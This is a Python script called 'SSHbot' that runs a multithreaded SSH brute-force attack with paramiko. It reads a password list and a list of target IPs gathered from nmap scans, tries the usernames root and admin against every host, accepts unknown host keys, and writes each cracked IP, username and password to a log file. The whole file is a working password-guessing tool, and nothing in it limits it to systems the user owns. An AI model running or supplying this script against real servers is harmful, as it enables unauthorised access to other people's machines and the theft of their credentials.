# Imports
import paramiko
import time
import threading
import sys
import socket

class SSHbot:
    cracked = 0
    username_list = ['root', 'admin']
    ip_list = []
    password_list = []
    port = 22

    def __init__(self):
        # SSH password list
        with open('ssh_password_list.txt', 'r') as f:
            for line in f.readlines():
                password = line.strip('\n')
                self.password_list.append(password)
        # New SSH ip list from nmap scans and grepy
        with open('grepy_ips_new.txt', 'r') as fp:
            for line in fp.readlines():
                ip = line.strip('\n')
                self.ip_list.append(ip)

    
    def write(self, ip, user, password):
        with open('SSH_logins.txt', 'a') as f:
            f.write(f'[IP]{ip} [USER]{user} [PASSWORD]{password}\n')

    def ssh_connect(self, ip, user, password, code=0):
        # Create session
        ssh = paramiko.SSHClient()
        # Set policy to use when connecting to server with unknown host keys
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            # Connect to SSH/SFTP server using domain/ip, port, username, password
            ssh.connect(ip, self.port, user, password, banner_timeout=30, allow_agent=False, look_for_keys=False)
        except paramiko.AuthenticationException:
            # [*] Authentication Failed...
            code = 1
        except paramiko.SSHException:
            # [*] SSH Failed...
            code = 2
        except socket.error as e:
            # [*] Connection Failed... Host Down
            code = 3
        ssh.close()
        return code

    def run(self):
        for ip in self.ip_list:
            t1 = threading.Thread(target=self.main, args=(ip,))
            t1.start()

    def main(self, ip):
        found = False
        for user in self.username_list:
            if found:
                break
            for password in self.password_list:
                try:
                    response = self.ssh_connect(ip, user, password)

                    if response == 0:
                        # If password is equal to below string, then error has occured and is giving a false positive
                        if password == 'abcdefghijklmnopqrstuvpksisjdiad9238ue398j9jlsuihaiaushfl9w8yh948tujsh':
                            print(f'[*] Connection is giving false authentication: {ip}')
                            found = True
                            break
                        print(f'\t[*] {ip} [*] {user} [*] Pass: {password} => Login Correct *** <=')
                        self.write(ip, user, password)
                        self.cracked +=1
                        found = True
                        break
                    elif response == 1:
                        print(f'[*] {ip} [*] {user} [*] Pass: {password} => Login Incorrect !!! <=')
                    elif response == 2:
                        print(f'[*] SSH failed to address: {ip}')
                        found = True
                        break
                    elif response == 3:
                        print(f'[*] Connection could not be established to address: {ip}')
                        found = True
                        break
                except Exception as e:
                    print(e)
                    pass



if __name__=='__main__':
    try:
        s = SSHbot()
        s.run()
    except:
        pass